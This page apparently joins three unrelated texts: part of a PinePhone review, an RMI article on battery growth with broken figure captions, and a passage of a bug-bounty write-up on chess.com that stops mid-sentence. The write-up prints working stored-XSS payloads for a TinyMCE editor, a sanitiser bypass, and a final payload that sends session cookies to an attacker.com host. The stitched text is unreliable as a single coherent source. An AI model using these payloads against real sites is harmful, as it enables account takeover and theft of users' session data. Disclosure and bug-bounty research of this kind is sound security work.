<p>I made an adapter to use with Samsung S20 Ultra battery case, but some strange USB issues kill the modem while case is active, so I could not try it out very well.</p>

<br>
<h2>Software</h2>
<p>postmarketOS stable with Phosh (installed on new 128GB SD card)</p>

<br>
<h3>Installation</h3>
<p>TLDR: EASY.</p>
<p>To install an OS, you flash an image to an SD card, put it in the PinePhone and turn it on. That's it. You can swap OSes by changing SD cards as much as you want.</p>
<p>Compare to Android, which involves unlocking the bootloader, flashing recovery, booting into recovery, flashing an OS image, and possibly patching the image to get root.</p>
<p>Compare to iOS which doesn't let you do that to any reasonable extent.</p>
<p>(Yes, I know normal people do not install OS on their phones...)</p>
<br>
<h3>Activation</h3>
<p>TLDR: No hand-holding, but only few settings.</p>
<p>When you start some distros/desktops, you are presented with a short tutorial. You need to configure the mobile connection yourself, but it's usually just setting the APN and MMSC URLs. For postmarketOS+Phosh, the APN setting is in Settings/Mobile Networks, and MMSC setting is in Chats/Settings.</p>

<p>Compare to Android, which requires clicking through multiple pages of setup. Although most of that is skippable (depending on the manufacturer too, I guess).</p>
<p>Compare to iOS, which not only annoys you to set up Siri and Face ID on setup and at every update, but does not allow you to activate the phone without an SMS message. (Very convenient when in another country with no coverage or high roaming charges)</p>
<br>
<h3>UI</h3>
<p>TLDR: Phosh is conventional and practical. SXMO is a bit unusual but pretty cool and very customizable.</p>
<p>Phosh navigation uses the bar on the bottom of the screen (similar enough to iOS and Android), which opens both a list of running applications and an app drawer. All apps in the drawer are listed alphabetically but can be added to the favorites list on top. </p>
<p><img src="https://yaky.dev/2024-01-25-pinephone-post-daily-driver-review/phosh.jpg" alt="Phosh app drawer"></p>
<p>I think this unification of home screen with the app drawer is simpler and faster than Android/iOS pinned apps + pages, and much more organized than iOS's "home screen is an app dumpster" (which i see on many people's phones).</p>
<p>There are occasional slowdowns but they are not significant.</p>
<p>Some unimplemented controls, such as switch for location and inhibit-suspend (aka caffeine), I wrote as desktop entries ("shortcuts" that show up in app drawer).</p>
<p>Most GTK-based apps are more or less consistent in their styling, and you can force a theme on everything if you want to. Qt is a bit all over the place.</p>
<p>Phosh does not have a global "back" button, so each application has to implement its own UI. Usually, the back button is in the upper left, which is very inconvenient. Although, new Android and iOS now use the "swipe from left edge" to go back, which is equally unwieldy for people with regular-length thumbs. Android with its back button on the bottom bar is still the best in this regard.</p>
<p>Another desktop environment is SXMO. It has a menu-based UI that you navigate using the volume and power buttons, as well as some pre-defined gestures for other actions. It is intended to be used with simple terminal-based tools, but I had no problems running any other software. I liked being able to open applications side-by-side, override and customize any menu (you can even make app-specific menus for most-used actions, for example), and run hooks on events (such as custom notifications for texts, calls, etc).</p>

<br>
<h3>Keyboard</h3>
<p>TLDR: Simple, but customizable</p>
<p>Phosh uses squeekboard, which is a pretty standard, simple keyboard which supports multiple languages and can be very easily customized by editing a YAML file. There's no swipe, spell-check, or predictive text, but there are other projects that try to implement that.</p>
<p>SXMO uses wvkbd, which is aimed more towards terminal use and includes cursor keys, modifiers (Ctrl, Alt), and other useful keys (/, -, Tab). To customize wvkbd, you... compile it from source. It's pretty straightforward C and builds in a few seconds.</p>
<br>
<h3>Notifications</h3>
<p>TLDR: Only calls and SMS notifications are truly real-time.</p>
<p>If PinePhone is in sleep (by default, after 2 minutes of idle on Phosh), it cannot receive notifications. The modem (which, itself, is another Linux device) is always on, so once it receives a call or SMS, it will wake PinePhone up. Theoretically, it should be possible to have modem check for notifications, but I am not aware of any project that did this yet. </p>
<p>The way notifications present themselves is per-application, more or less. On Phosh, Calls vibrate continuously for calls, Chats vibrates and chimes. Fractal (Matrix messenger), and Dino (XMPP messenger), however, produce notifications silently. But you have access to their source code, so that can be changed - I rebuilt Dino with noisy notifications before.</p>
<p>There are no icons on the status bar, but most notifications show in the pull-down panel and make the LED blink blue. Yes, I love blinkenlights. However, blinking the LED is kind of silly, because if the phone goes to sleep, it will keep the LED state it last had (either permanently on or off).</p>
<p>Compare with Android, which mostly got rid of the notification light :( But notifications are shown in the status bar and can wake the screen.</p>
<p>Compare with iOS, whose UI is terrible in this regard. Notifications wake the screen, and show on lockscreen, but only until you unlock the phone. Then they are dropped somewhere into "notification center", which required an additional swipe to open. And unless you start a habit of checking that separate screen, you can miss them for a long time. The status bar is taken up by the notch, so there is no space for icons there. </p>
<br>
<h3>Phone calls</h3>
<p>TLDR: Probably fine for 2G and 3G calls, but VoLTE is flaky and unpredictable.</p>
<p>Your experience may vary wildly. According to forums, github, and reddit:</p>
<ul>
<li>Some people report no issues placing and receiving calls with PinePhone as-is.</li>
<li>Some even use it exclusively as a phone, no other software.</li>
<li>Some install and use the FOSS modem firmware, and it resolves their issues.</li>
<li>Some people report that FOSS modem firmware causes more issues, and recommend reverting to stock 01.003 or 01.002 version for stability.</li>
</ul>

<p>For me, calls were extremely unreliable. Just for the information, I have T-Mobile as my provider (which is one of the few that allow PinePhone in the US), but I live in a hilly neighborhood of a small city where my signal strength shows 50% at best for 4G, and 25% for 2G. 3G has been disabled and 2G significantly scaled down by all US carriers AFAIK. Because of that, I have to rely on VoLTE for calls. Which, I believe, is the main cause of my problems. As far as I know, PinePhone's modem, Quectel EG25-G, is intended for IoT devices, and technically supports VoLTE, but not officially.</p>

<p>These are the issues I had:</p>
<ul>
<li>Modem crashes for no apparent reason. Takes about 30 seconds to restart. Somewhat better with FOSS firmware though.</li>
<li>Phone shows 4G connectivity, but modem will reboot or stop responding when trying to call or use data. Seems to happen after long periods of sleep.</li>
<li>Unable to place a call. Phone either drops the call immediately, or waits about 30 seconds and then drops it. Presumably, the delay is an attempt to place a call over 2G, which, due to poor signal, does not happen. Sometimes, keeping the phone awake for a few minutes seems to reconnect it to VoLTE, and allows me to call. Sometimes not, and once, I have been unable to call for up to 30 minutes.</li>
<li>Unable to receive a call. Callers say their call goes straight to voicemail, or rings once and then is sent to voicemail. I get absolutely no indication of missed calls. Usually happens after the phone has been in sleep for some length of time. One way to improve the chances of receving a call is to keep the phone plugged in and awake. My suspicion is that a sleeping modem cannot accept VoLTE calls, and if a call cannot come in through 2G, it is dropped.</li>
<li>Rarely, call drops in the middle of the call, then either one of the above issues happens. Usually, once call is connected, it is fine.</li>
<li>Phone gets uncomfortably hot at the top, where the earpiece (and, i suppose, the antenna) is.</li>
</ul>

<p>I tried several firmwares, and they all had their benefits and drawbacks, but the VoLTE problems above persisted for all of them:</p>
<ul>
<li>Biktorgj's FOSS firmware 0.7.4, ADSP 01.003 and others. Lots of cool features (tracking, alarm-via-modem), lower power consumption, automatic checking for stuck SMS messages, modem seems to crash less. However, did not seem to connect to 2G properly, no voice / echo correction (I sound super quiet on the call, and cannot use speakerphone), and no automatic GPS switch (have to run a sudo script to enable it). All incoming calls went to voicemail.</li>
<li>Stock firmware 30.006, latest. Had voice / echo correction and automatic GPS, but incoming calls still go to voicemail. Crashes more than FOSS though.</li>
<li>Stock firmware 01.002, sort-of-original, and recommended for stability. Has voice / echo correction, automatic GPS, and correctly downgrades to 2G when placing calls. Some incoming calls came through.</li>
</ul>


<p>Some people on the forum recommended modifying udev rules to keep the power to permanently on for stock firmware (it is set to "auto" by default), but that did not seem to help, just increased the battery drain.</p>

<p>Out of curiosity, I tried Mobian OS, which uses a different kernel with some modem-related improvements. One noticeable change is a very strong mic boost that sounds like rumbling or cat purr to the other part. I suppose this is to address the "too quiet" issue for FOSS firmware? At that point, I did not want to try re-installing firmware again.</p>
<p>On that note, UBPorts does not support VoLTE on ANY of their devices.</p>

<p>To eliminate another potential cause, I got a new SIM card. I didn't think it would matter, but my friend suggested to do it anyway, as he had to get a new SIM card to get 3G working on his phone (many years ago). That didn't help.</p>

<p>Interestingly enough, while I was writing this, calling using my current (officially supported by T-Mobile) Android phone, I got a very similar scenario: about 30 seconds of attempting to call, phone frantically switching between VoLTE and VoWiFi, then dropping the call. The second attempt went through 2G and connected. Maybe I should not blame PinePhone's modem here...</p>
<br>
<h3>Voicemail</h3>
<p>TLDR: You get cryptic texts.</p>
<p>When you get a voicemail, you get a data text message from a short number, so you will know you got one. There is VVMD (visual voicemail daemon), but I did not try setting it up.</p>
<br>
<h3>Texting</h3>
<p>TLDR: Works well.</p>
<p>Basic text messaging through SMS and media through MMS work well and without issues. </p>
<p>The default (and only?) text messenger, Chats, does not natively play some formats (for example, 3gp video), but they will open as long as you have the appropriate application.</p>
<p>I really have no complaints here because I remember when getting MMS and unblocking the SMS queue on the modem were manual operations.</p>
<p>On PinePhone, text messages will wake up the phone, so they are almost realtime, as one would expect.</p>
<br>
<h3>Messaging</h3>
<p>TLDR: Works well, no notifications in sleep.</p>
<p>Although Chats lets you use Matrix accounts and even supports encryption messaging, there are several usability issues, resulting in disconnections, missed messages, and crashes. </p>
<p>For Matrix, Fractal (via flatpak) works very well, although has some minor UI issues. Nheko works well, seems a bit faster, and has swipe controls (if that's your thing).</p>
<p>For XMPP, I have used Dino in the past, and it is also a very well-made messenger, with audio and video call functionality (which I have not tried).</p>
<p>I do not have any contacts on Signal, so I have not tried any Signal clients or bridges.</p>
<p>For WhatsApp, I run a Matrix bridge, so 99% of messages are routed through my Matrix client. For once-in-a-while calls, I use an old device I keep at home.</p>
<br>
<h3>Camera</h3>
<p>TLDR: Potato, no video out of the box.</p>
<p>Camera works okay. Raw camera data has to be post-processed to balance colors, so it takes several seconds for a photo to appear in a directory. Sometimes, post-processing fails and you get a black rectangle. Editing some shell-scripts, I removed the heavy part of post-processing (sharpening) and reduced the processing time to around a second.</p>
<p>The quality is poor by any standard since 2010: the pictures are grainy and have low dynamic range. At the same time, they look like old film photos, and there's a certain charm to it.</p>
<p><img src="https://yaky.dev/2024-01-25-pinephone-post-daily-driver-review/pinephone-photo.jpg" alt=""></p>
<p>Do not let the phone go to sleep with the camera app open, or it might enter a state where it cannot wake up and needs to be rebooted.</p>
<p>There are no apps to shoot video, but it's possible via scripts (I have not tried).</p>
<p>While having a bad camera can be frustrating, think about all the pictures you took and never looked at again.</p>
<br>
<h3>Navigation</h3>
<p>TLDR: Works. Not Google Maps though, learn your local roads.</p>
<p>Osmin is a good navigation app with live directions, voice, and offline maps.</p>
<p>GNOME Maps 45 and later has decent mobile UI, but does not have offline capabilities AFAIK.</p>
<p>As is with many apps based on OpenStreetMap data, do not expect that you'll be able to find an address (at least in the US) in Osmin, so use POIs or intersections instead. I think the only app that supports address lookup is Pure Maps, but it was fairly slow for me.</p>
<p>PinePhone's GNSS/GPS module works through the modem. Which sort of makes sense, but then, you can't use GPS without a SIM card installed... When GPS is enabled, it takes 10-15 minutes to get a precise location. Before that, your location is derived from Mozilla Location Service, map of known WiFi spots and their approximate locations, so it can be VERY rough (precision of a few streets away for me). GPS module does support AGPS (assisted GPS, locations of satellites downloaded over the internet) for faster location detection, but AFAIK none of the OSes implement that. (In fact, the modem has the config for it, and should be able to download it itself).</p>
<p>Interestingly, on my degoogled Android, I get a similar experience - very rough location until ~10 minutes later. Makes you consider how much Google knows everyone's router's location.</p>
<br>
<h3>Music</h3>
<p>TLDR: Spotify playback is spotty.</p>
<p>I listen to mostly Spotify, and there is a mobile Linux client called Spot (both postmarketOS/Alpine repos and Flatpak). The main issue with it is that the playback stops after 2-4 songs. Not sure if that is an application issue, or the classic "sound on Linux" issue.</p>
<p>Of course, there's an official Spotify client, but it is available only for desktop Linux (x86_64).</p>
<p>There is spotify-qt, which did not work for me, and spotify-tui for the terminal(!), which I did not try.</p>
<br>
<h3>Browser</h3>
<p>TLDR: Stick with Firefox ESR.</p>
<p>Firefox ESR is the default on many Linux distributions. It is a desktop browser, adapted for mobile. Although it takes a while to load, the browsing is fast. There are some UI issues, and it can feel clumsy to use sometimes, but you should be able to do everything a desktop browser can. And it includes uBlock Origin add-on by default!</p>
<p>GNOME Web has great UI, some adblocking, and Firefox account integration (!), but the renderer itself (based on WebKit) is just too slow.</p>
<p>Angelfish has a nice UI and seems relatively fast, but I haven't used it much to have an opinion.</p>
<p>Another interesting option is BadWolf, WebKit-based browser with toggles for JS and images. Great idea, but I couldn't use it because it cannot focus on a textbox on the page (e.g. search box)</p>
<p>And for the terminal, there is the good old Lynx and w3m.</p>
<p>For gemini, Geopard looks and works really well.</p>
<br>
<h3>Notes</h3>
<p>TLDR: Several options.</p>
<p>I used gedit instead of the newer Text Editor to keep notes, as I found the UI better (fewer steps to do things). There are several note-taking apps, but they are too slow and have too many features that I don't need.</p>
<br>
<h3>Android applications</h3>
<p>TLDR: Possible.</p>
<p>To run Android applications, postmarketOS supports waydroid, which was surprisingly easy and straightforward to install. Launching LineageOS takes about a minute, and running apps drains the battery much quicker, but I was able to install and use a few things from F-Droid and Aurora Store. Expect apps to complain about Google Play Services.</p>
<br>
<h3>Connecting to PC</h3>
<p>TLDR: UNLIMITED POWER!</p>
<p>The "killer feature" of PinePhone is that you can SSH into it as any other Linux machine. If you run SXMO, you can easily navigate the same menus and text/message through the terminal.</p>
<p>I wrote a small rsync script to backup/sync notes and pictures onto my laptop. It does not require Syncthing (saves PinePhone's limited resources) or any complicated setup.</p>
<p>On Android, I sync my notes and pictures using Syncthing, which requires some setup, but is very convenient too.</p>
<p>On iOS, photos are not considered files (WTF Apple?!), so they cannot be synced with Mobius (Syncthing-like app). So the only way to back them up is via USB (which requires additional setup on Linux). </p>
<br>
<h2>Conclusion</h2>
<p>My daily adventures with PinePhone have reached their end. PinePhone is refreshingly straightforward, and practical for many of my daily tasks. Alas, it was not much of a phone. Perhaps PinePDA would be a more fitting name.</p>

					<h3>The Rise of Batteries in Six Charts and Not Too Many Numbers</h3>
					<h6>The unstoppable rise of batteries is leading to a domino effect that puts half of global fossil fuel demand at risk.</h6>
					
											<p>Battery demand is growing exponentially, driven by a domino effect of adoption that cascades from country to country and from sector to sector. This battery domino effect is set to enable the rapid phaseout of half of global fossil fuel demand and be instrumental in abating transport and power emissions. This is the conclusion of RMI’s recently published report <em><a href="https://rmi.org/insight/x-change-batteries/">X-Change: Batteries</a></em>. In this article, we highlight six of the key messages from the report.</p>
<h5>1. Battery sales are growing exponentially up S-curves</h5>
<p>Battery sales are growing exponentially up classic <a href="https://rmi.org/insight/harnessing-the-power-of-s-curves/">S-curves</a> that characterize the growth of disruptive new technologies. For thirty years, sales have been doubling every two to three years, enjoying a 33 percent average growth rate. In the past decade, as electric cars have taken off, it has been closer to 40 percent.</p>
<p><strong>Exhibit 1: Global battery sales by sector, GWh/y</strong></p>
<p><a href="https://rockymntstage.wpengine.com/wp-content/uploads/2024/01/slide-1-battery-charts.png" target="_blank" rel="noopener"><img fetchpriority="high" decoding="async" src="https://rockymntstage.wpengine.com/wp-content/uploads/2024/01/slide-1-battery-charts-1024x576.png" alt="" width="1024" height="576"></a><br>
<small>Source: Ziegler and Trancik (2021), Placke et al. (2017) for 1991-2014; <i>BNEF Long-Term Electric Vehicle Outlook</i> (2023) for 2015-2022 and the latest outlook for 2023 (*) from the BNEF Lithium-Ion Battery Price Survey (2023).</small></p>
<h5>2. Battery costs keep falling while quality rises</h5>
<p>As volumes increased, battery costs plummeted and energy density — a key metric of a battery’s quality — rose steadily. Over the past 30 years, battery costs have fallen by a dramatic 99 percent; meanwhile, the density of top-tier cells has risen fivefold. As is the case for many modular technologies, the more batteries we deploy, the cheaper they get, which in turn fuels more deployment. For every doubling of deployment, battery costs have fallen by 19 percent. Couple these cost declines with density gains of 7 percent for every deployment doubling and batteries are the fastest-improving clean energy technology.</p>

<h5>3. Creating a battery domino effect</h5>
<p>As battery costs fall and energy density improves, one application after another opens up. We call this the battery domino effect: the act of one market going battery-electric brings the scale and technological improvements to tip the next. Battery technology first tipped in consumer electronics, then two- and three-wheelers and cars. Now trucks and battery storage are set to follow. By 2030, batteries will likely be taking market share in shipping and aviation too.</p>

Trains, ships, and airplane total addressable market sizes illustrative.</small></p>
<h5>4. Incumbent modelers remain behind the curve</h5>
<p>How fast will batteries continue to grow and improve? The answer is a lot faster than today’s consensus view. When it comes to the growth of small modular technologies, there are two rules of thumb: the first is that superior technologies undergoing rapid cost decline tend to grow exponentially; the second is that most analysts miss the first. Batteries have been no exception to this rule, having been consistently underestimated by modelers.</p>
<p>Over the past years, many battery forecasts have effectively projected linear growth. As Exhibit 4 illustrates, actual sales keep outrunning such forecasts and as a result analysts keep revising their projections upward. The caution of such linear thinking may, on the surface, seem reasonable, but in reality, it is simply wrong.</p>

<p><small>Source: IEA <em>Global EV Outlook </em>(2018-2023) current policy scenarios and actuals; BNEF <em>Long-Term Electric Vehicle Outlook</em> (2023) for 2023 estimate.</small></p>
<h5>5. The drivers of change will strengthen</h5>
<p>If we look forward to the next seven years, we see the drivers of change strengthening. Notably, we see costs continuing to fall, policy support continuing to rise, and competition between economic blocs continuing to drive a race to the top. And while there are barriers to battery adoption on the horizon, humanity’s wit, will, and capital are scaling proportionally faster. Thus, we do not see a scenario of slow adoption as credible; instead, we model two futures: fast or faster. Reality is likely to lie somewhere between the two.</p>
<p>RMI forecasts that in 2030, top-tier density will be between 600 and 800 Wh/kg, costs will fall to $32–$54 per kWh, and battery sales will rise to between 5.5–8 TWh per year. To get a sense of this speed of change, the lower-bound (or the “fast” scenario) is running in line with BNEF’s Net Zero scenario. The faster S-curve scenario exceeds it.</p>

<h5>6. Enabling the phase-out of fossil fuels</h5>
<p>The best strategy to rapidly phase out fossil fuels is to accelerate the deployment of technologies that reduce fossil fuel <em>demand</em>. Batteries are on the path to displace 86 exajoules (EJ) of fossil fuels from road transport (emitting 6 GtCO<sub>2 </sub>per year) and to put at risk another 23 EJ (or 1.6 GtCO<sub>2</sub>/y) from shipping and aviation. In the electricity sector, as batteries synchronize the natural rhythms of the sun and the wind with the timing of electricity demand, they help enable the reduction of a further 175 EJ of fossil fuel demand (or almost 15 GtCO<sub>2</sub>/y).</p>
<p><strong>Exhibit 6: CO<sub>2</sub> emissions abatement enabled by batteries, GtCO<sub>2</sub>/y abatement versus emissions today</strong></p>

<p><small>Source: IEA NZE scenario (other transport); RMI analysis (power and road transport)</small></p>
<p>Batteries are growing fast, but that’s no reason to rest on our laurels. Continued growth will require continued effort. Batteries got this far through tireless, concerted efforts of companies, governments, researchers, and climate advocates. And whether the motivation is lower prices, geopolitical advantage, or climate, it is essential to make this fast transition faster.</p>

<div id="readability-page-1" class="page"><section>
				<p>Playing Chess is one of the many hobbies I like to do in my spare time, apart from tinkering around with technology. However, I'm not very good at it, and after losing many games, I decided to see if I could do something I'm much better at; hacking the system!</p><p>This blog post is about how I used my cybersecurity knowledge to find XSS on the #1 chess site on the internet, with a user base of over <strong>100 million</strong> members - <a href="https://chess.com/?ref=skii.dev" rel="noreferrer">Chess.com</a>. But first, a bit of preface (that includes a slightly less serious, although amusing, OSRF vulnerability!)</p><hr><p>In early 2023, I started playing a lot on chess.com; during a discussion with a friend on Discord, I persuaded them to also sign up to the site and used a feature offered by <code>chess.com</code> to become friends once they signed up immediately. </p><figure><img src="https://skii.dev/content/images/2024/01/Untitled.png" alt="" loading="lazy" width="460" height="174"></figure><p>This feature reminded me of the <a href="https://www.vice.com/en/article/wnjwb4/the-myspace-worm-that-changed-the-internet-forever?ref=skii.dev" rel="noreferrer">MySpace worm</a> in ~2005 (heck, I wasn't even alive then!) when Samy Kamkar injected some code into his profile that would friend anyone who visited it and then inject the same code into their profile (hence creating the worm). I wondered if it would be possible to do something similar here. I clicked on the link and created a new account, then checked the dev tools network tab - interestingly, <strong>after</strong> the account had been made, it sent a GET request to <code>htttps://chesss.com/registration-invite?hash=XXX</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-1.png" alt="" loading="lazy" width="543" height="653"></figure><p>This meant that if I could get a user to request this URL, it would force them to friend me automatically. Coincidentally, I was also messing with my settings when I came across the holy grail.....a TinyMCE rich text editor with an image upload function! </p><figure><img src="https://skii.dev/content/images/2024/01/image-3.png" alt="" loading="lazy" width="753" height="559" srcset="https://skii.dev/content/images/size/w600/2024/01/image-3.png 600w, https://skii.dev/content/images/2024/01/image-3.png 753w"></figure><p>Let's see what happens when I insert a <a href="https://i.imgur.com/0PmEjVm.png?ref=skii.dev" rel="noreferrer">link</a> for the image. Is the URL embedded directly, or will there be some safe handling to protect against request forgeries? </p><figure><img src="https://skii.dev/content/images/2024/01/image-11.png" alt="" loading="lazy" width="1430" height="521" srcset="https://skii.dev/content/images/size/w600/2024/01/image-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-11.png 1000w, https://skii.dev/content/images/2024/01/image-11.png 1430w" sizes="(min-width: 1200px) 1200px"></figure><p>Chess.com handles this server-side by re-uploading the image to their content hosting server and then pointing the image URL to that. Hmmm...<em>But</em> what about using a link whose root domain is <code>chess.com</code>? Would that still get re-uploaded? This would be important, especially when chained with a specific URL like...</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-1.png" alt="" loading="lazy" width="460" height="263"></figure><figure><img src="https://skii.dev/content/images/2024/01/image-12.png" alt="" loading="lazy" width="753" height="100" srcset="https://skii.dev/content/images/size/w600/2024/01/image-12.png 600w, https://skii.dev/content/images/2024/01/image-12.png 753w"></figure><p><strong>BINGO!</strong> I switched to my alt account, navigated to my main account's profile and then checked my alt's friend list - it had successfully added my main account. </p><figure><img src="https://skii.dev/content/images/2024/01/image-7.png" alt="" loading="lazy" width="771" height="313" srcset="https://skii.dev/content/images/size/w600/2024/01/image-7.png 600w, https://skii.dev/content/images/2024/01/image-7.png 771w" sizes="(min-width: 720px) 720px"></figure><p>I genuinely couldn't believe this had worked, and I had quite a chuckle about it. During the bug-bounty report &amp; triage, the developers tried to implement a block because when I tried to reproduce it again for them, it came up with the following error message:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-2.png" alt="" loading="lazy" width="246" height="116"></figure><p>No problem at all, though; I managed to bypass it again by setting up a subdomain that included <code>chess.com</code> &amp; redirected it to <code>/registration-invite</code> </p><figure><img src="https://skii.dev/content/images/2024/01/image-8.png" alt="" loading="lazy" width="892" height="399" srcset="https://skii.dev/content/images/size/w600/2024/01/image-8.png 600w, https://skii.dev/content/images/2024/01/image-8.png 892w"></figure><p>And here's what it looked like when visiting my profile:</p><figure><img src="https://skii.dev/content/images/2024/01/image-13.png" alt="" loading="lazy" width="1436" height="373" srcset="https://skii.dev/content/images/size/w600/2024/01/image-13.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-13.png 1000w, https://skii.dev/content/images/2024/01/image-13.png 1436w" sizes="(min-width: 1200px) 1200px"></figure><p>After finding and reporting this bug, I was very interested in what else I could achieve by abusing TinyMCE - could I get XSS? How good was the sanitisation? That brings us to the exciting part of the blog post...</p><hr><p>After playing around with the editor for a bit, I realised I wouldn't get very far without using something like <a href="https://portswigger.net/burp?ref=skii.dev" rel="noreferrer">Burp's proxy</a> to intercept the request to save my <code>About</code> description and inject raw HTML code directly (Anything written in the editor was treated as text). Of course, as one would expect, there were already preventions to remove any non-whitelisted attributes and tags - so let's look at what <em>is</em> allowed. </p><p>Viewing the TinyMCE config on the site (you can find this in the <code>tinymce-lazy-client.js</code> file), for <code>img</code> tags the <code>background-image</code> style attribute is in the <code>Allow</code> list and does not get filtered out. This was a long shot, but I wondered if the function to re-upload any external URL for the image also got applied to the attributes. Well...no harm in trying; let's see what happens using the following payload:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://test.com/);"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-3.png" alt="" loading="lazy" width="1556" height="322" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-3.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-3.png 1000w, https://skii.dev/content/images/2024/01/Untitled-3.png 1556w" sizes="(min-width: 1200px) 1200px"></figure><p> I actually couldn't believe my eyes when I loaded up my profile. It had indeed conveyed the URL, and somewhere along this process, something had gone terribly wrong, resulting in a <code>"</code> being appended to the beginning of the new link. This resulted in the style attribute being closed prematurely, causing the URL to be converted into extra attributes! </p><p>Because adding unfiltered attributes was possible, I tried to figure out how I could generate a payload that the server would manipulate into running malicious javascript on image load. It seemed that in the URL, <code>/</code> was being used as a delimiter, with each element between it being added as a new attribute. So I tried with <code>url('https://test.com/onload') </code></p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-4.png" alt="" loading="lazy" width="540" height="119"></figure><p>To figure out how to add a payload, I tried fuzzing through all the symbols and seeing how each changed the final result. Through this tactic, I worked out you could add a <code>?</code> to modify the subsequent attribute data (although this comes with the slight caveat that you wouldn't be able to use the <code>?</code> symbol in the rest of the payload). Using the following:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=alert);"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-5.png" alt="" loading="lazy" width="640" height="99" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-5.png 600w, https://skii.dev/content/images/2024/01/Untitled-5.png 640w"></figure><p>Now we have another issue: the final <code>&amp;quot;&amp;quot;</code> at the end will throw a syntax error every time, preventing code from running...let's use <code>//</code> to comment that out and test a basic <code>alert(1)</code></p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url('https://images.chesscomfiles.com/?/onload=alert(1);//');"&gt; &lt;p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-7.png" alt="" loading="lazy" width="441" height="112"></figure><p>Damn, brackets are filtered….this means that I wouldn’t be able to call any functions with any parameters.</p><p>Even worse, practically every useful symbol is filtered – <code>,’ ^&amp;[]’$%</code> ...so how are we supposed to get any serious impact? Back to basics - Let’s see if we can set a variable, <code>x</code>, to <code>4</code>. (Luckily, the <code>=</code> symbol isn't filtered out.)</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload='x=2;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-8.png" alt="" loading="lazy" width="389" height="47"></figure><p>Using an <code>‘</code> in our payload messes up the JS (encoded to <code>%27</code>) and throws a syntax error. I had to do a bit of thinking here, but after a while, I realised that <code>%27</code> could also be interpreted as the end part of a modulus operation...maybe I could get the browser to execute that operation and then carry out the variable assignment. Here's the payload I came up with:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';x=2;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-9.png" alt="" loading="lazy" width="364" height="42"></figure><p><strong>RESULT!</strong> Now we're getting somewhere. Let's see if we can modify some inbuilt variables (like <code>document.cookie</code>) to a string instead. This might be a pain because all the usual ways of defining a new string utilise quotes or backticks that are unfortunately filtered out. </p><p>Time to do some googling. After a bit of rummaging around on StackOverflow, I came across this comment:</p><figure><img src="https://skii.dev/content/images/2024/01/Untitled-10.png" alt="" loading="lazy" width="570" height="35"></figure><p>So it turns out you can define a regex and then get the string from the <code>source</code> attribute! Let's incorporate this into our payload and try to overwrite the <code>PHPSESSID</code> cookie. (Thank you, Frobinsonj!)</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';document.cookie=/PHPSESSID=invalid /.source;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/Untitled-11.png" alt="" loading="lazy" width="1021" height="101" srcset="https://skii.dev/content/images/size/w600/2024/01/Untitled-11.png 600w, https://skii.dev/content/images/size/w1000/2024/01/Untitled-11.png 1000w, https://skii.dev/content/images/2024/01/Untitled-11.png 1021w" sizes="(min-width: 720px) 720px"></figure><p>Overwriting the cookies is cool, but we want to extract the currently set ones for a more significant impact. We can try to set the document and location variables to redirect the user to a site we own, adding on the cookies as parameters, but the problem is we can't use the <code>?</code> Symbol, as mentioned earlier.</p><p>Okay, so maybe not as a parameter - but there are other ways to include data in the URL - for example, by setting it in the path. Something like <code>http:attacker.com/sensitivedata</code> requires the use of a <code>/</code>, but unfortunately, we already use that to format the whole URL as a string via the regex trick.</p><p>However, who said we need to enter the <code>/</code> character manually? It's used all the time for directory paths, so there must already be a JavaScript variable with it included that we can tack onto! In this case, I quickly found <code>location.pathname</code></p><figure><img src="https://skii.dev/content/images/2024/01/image-14.png" alt="" loading="lazy" width="183" height="43"></figure><p>Here's the final payload:</p><pre><code>&lt;p&gt;&lt;img src="https://www.pngmart.com/files/22/Penguin-PNG-Photos.png" style="display: block; margin: 0 auto; background-image: url(https://images.chesscomfiles.com/?/onload=4';document.location=/http:attacker.com/.source+location.pathname+document.cookie;//');" class="imageUploaderImg" alt="" /&gt;&lt;/p&gt;</code></pre><figure><img src="https://skii.dev/content/images/2024/01/image-15.png" alt="" loading="lazy" width="1180" height="386" srcset="https://skii.dev/content/images/size/w600/2024/01/image-15.png 600w, https://skii.dev/content/images/size/w1000/2024/01/image-15.png 1000w, https://skii.dev/content/images/2024/01/image-15.png 1180w"></figure><p>Nice. So I can extract cookies without <em>HttpOnly</em><strong> </strong>or any other stored JavaScript objects. I pulled some sensitive account data and reported it to the security team. </p><p>Having managed to get this far, I felt pretty proud, but I'm always up for a challenge and enjoy pushing myself, so I wanted to try to get full XSS. I pondered for a couple of days about how I could achieve this. </p><p>Let's return to the original issue of using <code>url()</code> in the 